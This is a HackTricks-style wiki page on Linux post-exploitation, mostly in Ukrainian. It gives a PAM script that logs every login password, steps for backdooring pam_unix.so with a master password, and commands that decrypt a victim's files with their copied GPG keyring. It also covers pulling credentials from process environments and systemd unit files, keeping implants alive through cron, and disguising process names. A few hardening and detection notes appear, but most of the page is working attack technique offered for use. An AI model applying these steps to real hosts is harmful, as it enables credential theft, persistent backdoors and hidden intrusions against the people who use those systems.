# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

Давайте налаштуємо модуль PAM для запису кожного пароля, який користувач вводить при вході. Якщо ви не знаєте, що таке PAM, перегляньте:


{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**Для подальших деталей див. [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Нижче подано лише стислий огляд:

**Огляд техніки:**
Pluggable Authentication Modules (PAM) надають гнучкість у керуванні аутентифікацією в системах на базі Unix. Вони можуть підвищувати безпеку шляхом налаштування процесів входу, але також створюють ризики при неправильному використанні. У цьому огляді описано техніку перехоплення облікових даних під час входу з використанням PAM, а також запропоновано стратегії пом'якшення ризиків.

**Перехоплення облікових даних:**

- Створено bash-скрипт з ім'ям `toomanysecrets.sh`, який логуює спроби входу, фіксуючи дату, ім'я користувача (`$PAM_USER`), пароль (через stdin) і IP віддаленого хоста (`$PAM_RHOST`) у `/var/log/toomanysecrets.log`.
- Скрипт зроблено виконуваним і інтегровано в конфігурацію PAM (`common-auth`) з використанням модуля `pam_exec.so` з опціями запуску в тихому режимі та передачі токена аутентифікації в скрипт.
- Підхід демонструє, як скомпрометований Linux-хост може бути використаний для прихованого запису облікових даних.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**For further details check the [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Це лише підсумок:

The Pluggable Authentication Module (PAM) — система, що використовується в Linux для автентифікації користувачів. Вона працює на трьох основних поняттях: **ім'я користувача**, **пароль** та **сервіс**. Конфігураційні файли для кожного сервісу знаходяться в директорії `/etc/pam.d/`, де загальні бібліотеки обробляють автентифікацію.

**Мета**: Змінити PAM, щоб дозволити автентифікацію з певним паролем, обходячи реальний пароль користувача. Це особливо стосується бібліотеки `pam_unix.so`, що використовується файлом `common-auth`, який підключається майже всіма сервісами для перевірки пароля.

### Кроки для модифікації `pam_unix.so`:

1. **Locate the Authentication Directive** in the `common-auth` file:
- The line responsible for checking a user's password calls `pam_unix.so`.
2. **Modify Source Code**:
- Add a conditional statement in the `pam_unix_auth.c` source file that grants access if a predefined password is used, otherwise, it proceeds with the usual authentication process.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- Access is granted across various services (login, ssh, sudo, su, screensaver) with the predefined password, while normal authentication processes remain unaffected.

> [!TIP]
> Ви можете автоматизувати цей процес з допомогою [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Decrypting GPG loot via homedir relocation

If you find an encrypted `.gpg` file and a user’s `~/.gnupg` folder (pubring, private-keys, trustdb) but you can’t decrypt due to GnuPG homedir permissions/locks, copy the keyring to a writable location and use it as your GPG home.

Typical errors you’ll see without this: "unsafe ownership on homedir", "failed to create temporary file", or "decryption failed: No secret key" (because GPG can’t read/write the original homedir).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
Якщо секретний ключовий матеріал присутній у `private-keys-v1.d`, GPG розблокує та розшифрує без запиту passphrase (або запитає, якщо ключ захищений).


## Збирання облікових даних з оточення процесу (включно з контейнерами)

When you gain code execution inside a service, the process often inherits sensitive environment variables. These are a gold mine for lateral movement.

Швидкі виграші
- Вивести змінні оточення поточного процесу: `env` або `printenv`
- Вивести змінні оточення іншого процесу: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- Додайте `strings -z /proc/<PID>/environ`, якщо `tr`/`sed` під рукою немає
- У контейнерах також перевірте PID 1: `tr '\0' '\n' </proc/1/environ`

На що звертати увагу
- Секрети додатків і admin creds (наприклад, Grafana встановлює `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`)
- API keys, DB URIs, SMTP creds, OAuth secrets
- Proxy і TLS overrides: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

Примітки
- Багато систем оркестрації передають чутливі налаштування через env; вони успадковуються дочірніми процесами і стають доступними в будь-якій оболонці (shell), яку ви запустите в контексті процесу.
- В деяких випадках ці creds повторно використовуються по всій системі (наприклад, same username/password дійсні для SSH на хості), що дозволяє простий pivot.

## Облікові дані, збережені systemd у unit-файлах (Environment=)

Сервіси, запущені systemd, можуть зберігати облікові дані у unit-файлах як записи `Environment=`. Перелічіть і витягніть їх:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
Operational artifacts often leak passwords (e.g., backup scripts that call `zip -P <pwd>`). Those values are frequently reused in internal web UIs (Basic-Auth) or other services.

Hardening
- Перенесіть секрети в спеціальні сховища секретів (`systemd-ask-password`, `EnvironmentFile` з обмеженими дозволами, або зовнішні менеджери секретів)
- Уникайте вбудовування облікових даних у unit-файли; віддавайте перевагу drop-in файлам, доступним лише root, і видаляйте їх із систем контролю версій
- Міняйте leaked паролі, виявлені під час тестів

## Cron-based persistence with loopback mutex

- Копіюйте імпланти в кілька записуваних шляхів (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) та встановлюйте cron-записи типу `*/5 * * * * /tmp/<bin>`, щоб вони респавнилися навіть якщо видалені в інших місцях.
- Забезпечте **single-instance** виконання, прив'язавши фіксований loopback-порт (наприклад, `127.0.0.1:51125` або `127.0.0.1:52225`) і виходячи, якщо `bind()` не вдається; `ss -lntp | grep -E '51125|52225'` покаже mutex listener.
- Оператори можуть періодично масово вбивати будь-який процес, чий `cmdline` містить ім'я dropper (e.g., `init_stop`), тому повторне використання тих самих імен під час аналізу може призвести до конфліктів; обирайте унікальні імена файлів.

## Process masquerading via prctl + argv overwrite

- Встановіть коротке ім'я процесу за допомогою `prctl(PR_SET_NAME, "<label>")` (обмеження 15 байт для `comm`), зазвичай на `init`, щоб `/proc/<pid>/status` і GUI показували нешкідливу мітку.
- Перезапишіть буфер `argv[0]` в пам'яті після зчитування довжини `/proc/self/cmdline` та вказівника `argv[0]`, доповнюючи NUL-ами, щоб `/proc/<pid>/cmdline` і `ps` також показували підроблену мітку.
- Шукайте шляхом порівняння `Name:` у `/proc/<pid>/status` з реальним шляхом виконуваного файлу та пошуку loopback mutex listener'ів, що належать процесам із дуже короткими/порожніми cmdlines.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
